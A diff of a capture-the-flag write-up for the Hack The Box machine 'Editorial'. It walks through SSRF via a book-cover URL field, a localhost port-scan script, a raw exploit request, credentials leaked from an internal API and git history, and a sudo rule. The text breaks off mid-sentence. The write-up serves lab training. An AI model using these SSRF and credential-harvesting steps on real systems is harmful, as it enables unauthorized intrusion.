@@ -1,12 +1,13 @@
 # Key Takeaways
 - Keep it simple and don't make assumptions... if something smells like SSRF, then enumerate localhost! (user.txt)
+- Nginx does not allow code execution by default... don't tunnel vision on code execution even if file upload is possible (user.txt)
 - Go to the documentation ASAP (root.txt)
 
 # Editorial Overview
 - Platform: Linux
 - HTB Rating: Easy - Not Too Easy
 
-# Solving User.txt
+# Solving user.txt
 As we are starting off this machine with no information, I began with the typical nmap scans. We are given a pretty common setup, seeing SSH open and a single webserver on port 80.
 ```
 PORT   STATE SERVICE VERSION
@@ -41,14 +42,14 @@ While poking around the website, I ran a number of directory and file brute forc
         </script>
 ```
 
-Taking note that this script was printing the uploaded file path to the console, this sent me looking for a file upload vulnerability. Interestingly, this app makes great use a best practice in mitigating file upload vulnerabilities— it is changing the filename to a long, random ID upon upload. This however is obviously counteracted by the fact that it then displays the path and new name directly to the user in the web console.
+Taking note that this script was printing the uploaded file path to the console as well initiating the request upon clicking "Preview", this sent me looking for a file upload vulnerability. Interestingly, this app makes great use a best practice in mitigating file upload vulnerabilities— it is changing the filename to a long, random ID upon upload. This however is obviously counteracted by the fact that it then displays the path and new name directly to the user in the web console.
 <img width="772" height="264" alt="image" src="https://github.com/user-attachments/assets/226874b3-bfd5-4590-8f02-bff5efd9f568" />
 _Burp Suite request/response showing the new filename returned to the user_
 
 
 I overcommitted to this path a bit too long. Due to the server returning the filepath alongside a lack of _any_ file type filters, this initially felt like a very strong point of entry that could lead to RCE. However, I eventually realized that the `/static/uploads` folder would not execute code. I later confirmed that the Nginx server was being used as a simple proxy and was not routing any files to an interpreter. This alongside the flask app itself having no way to execute the files meant that code execution from arbitrary file upload in this way would be a dead end.
 
-I then looked toward the URL submission parameter, as anything that is accepting URLs without filtering screams Server Side Request Forgery (SSRF). While it definitely smelled like SSRF, I was initially tripped up by the fact that requests to http://localhost would simply time out, and didn't _seem_ to return any data. After playing with requests to `/upload-cover` in Burp Suite, I eventually realized that it WAS returning data, as it save the contents of the original request and then make a second request to display that content. This was later confirmed via the python code from the app itself below.
+I then looked toward the URL submission parameter, as anything that is accepting URLs without filtering screams Server Side Request Forgery (SSRF). While it definitely smelled like SSRF, I was initially tripped up by the fact that requests to `http://localhost` would simply time out, and didn't _seem_ to return any data. After playing with requests to `/upload-cover` in Burp Suite, I eventually realized that it WAS returning data, as it save the contents of the original request and then make a second request to display that content. This was later confirmed via the python code from the app itself below.
 ```python
 # If cover comes from an URL
 if url_bookcover:
@@ -77,3 +78,69 @@ for port in range(1,65535):
     except requests.exceptions.Timeout:
         print(f'Something on port {port}')
 ```
+
+Using this script, I found that there seemed to be a service running on localhost:5000. I sent a request to `/upload-cover` with `http://localhost:5000` as the bookurl and then intercepted the subsequent request/response to `http://editorial.htb/static/uploads/<file-id>` with Burp Proxy.
+```http
+POST /upload-cover HTTP/1.1
+Host: editorial.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://editorial.htb/upload
+Content-Type: multipart/form-data; boundary=---------------------------18058011123166126201882229252
+Content-Length: 361
+Origin: http://editorial.htb
+DNT: 1
+Connection: keep-alive
+Priority: u=0
+
+-----------------------------18058011123166126201882229252
+Content-Disposition: form-data; name="bookurl"
+
+http://localhost:5000
+-----------------------------18058011123166126201882229252
+Content-Disposition: form-data; name="bookfile"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------18058011123166126201882229252--
+```
+_Burp request to /upload-cover with bookurl pointing to `http://localhost:5000`_
+
+This response from the server shows successful SSRF, and seems to contain some API documentation.
+```json
+{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
+```
+
+I then continued attempting requests using the listed endpoints, eventually finding credentials when making a request to `http://localhost:5000/api/latest/metadata/messages/authors`.
+<img width="1122" height="380" alt="image" src="https://github.com/user-attachments/assets/7d535b01-f399-4baf-abf3-ea4b4f9d8390" />
+_Burp request with credentials returned from the endpoint_
+
+Remembering that SSH was available, I then successfully logged into the machine via the `dev` user and retrieved the user.txt flag.
+
+# Solving root.txt
+Once connected to the machine, I ran a couple of prelimary commands to look for easy privilege escalation methods (sudo, suid, id, groups, etc.). As nothing useful immediately turned up, I then noted that there was one other user on the system named `prod`. Considering the relationship between dev and prod, I figured it was likely that we would need to first escalate to this other user before gaining root access.
+
+Looking into the `~/apps` folder in the `dev` user's home directory reveals a .git folder. The config file and descriptions didn't yield anything helpful, however there did happen to be some log files with an interesting commit history in `~/apps/.git/logs/HEAD`.
+```
+0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905723 -0500     commit (initial): feat: create editorial app
+3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905870 -0500     commit: feat: create api to editorial info
+1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500   
+ commit: change(api): downgrading prod to dev
+b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906471 -0500     commit: change: remove debug and update api port
+dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906661 -0500     commit: fix: bugfix in api port endpoint
+```
+
+Noting the 3rd commit, viewing the changes made to downgrade from prod to dev would be extremely interesting to us, especially since we initally got our credentials from a message that was embedded in the code. I read what code changes were made between the initialization of the app and the downgrade to prod via a git diff:
+```
+git diff 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28
+```
+
+As expected, this revealed credentials for the `prod` user account.
+<img width="1269" height="363" alt="image" src="https://github.com/user-attachments/assets/f597fc64-c290-4148-b7ae-26857dadcf3a" />
+
+I then used SSH to log into the `prod` account. I did some initial checks again, and quickly found that this account has access to single command with root privileges via `sudo -l`.
+We are able to run: `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *`
+
+The use of absolute paths here is good, so I 
